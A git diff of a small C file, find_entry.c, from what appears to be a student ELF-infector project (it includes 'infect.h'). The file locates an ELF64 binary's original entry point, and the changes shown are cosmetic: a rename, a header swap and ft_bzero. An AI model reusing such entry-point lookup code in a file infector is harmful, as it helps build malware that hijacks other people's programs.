@@ -1,19 +1,20 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   elf64_find_entry.c                                 :+:      :+:    :+:   */
+/*   find_entry.c                                       :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/05/10 23:43:29 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/03 21:24:46 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/06 04:48:04 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include <strings.h>
 #include "infect.h"
+#include "utils.h"
 
-struct		data{
+struct	data
+{
 	struct entry	*stored_entry;
 	Elf64_Addr	e_entry;
 };
@@ -77,7 +78,7 @@ bool		find_entry(struct entry *original_entry, struct safe_pointer info,
 	if (!safe_elf64_hdr) return (false);
 	closure.e_entry = endians.endian_8(safe_elf64_hdr->e_entry);
 
-	bzero(original_entry, sizeof(*original_entry));
+	ft_bzero(original_entry, sizeof(*original_entry));
 	closure.stored_entry = original_entry;
 
 	if (!foreach_phdr(info, endians, find_entry_phdr, &closure))
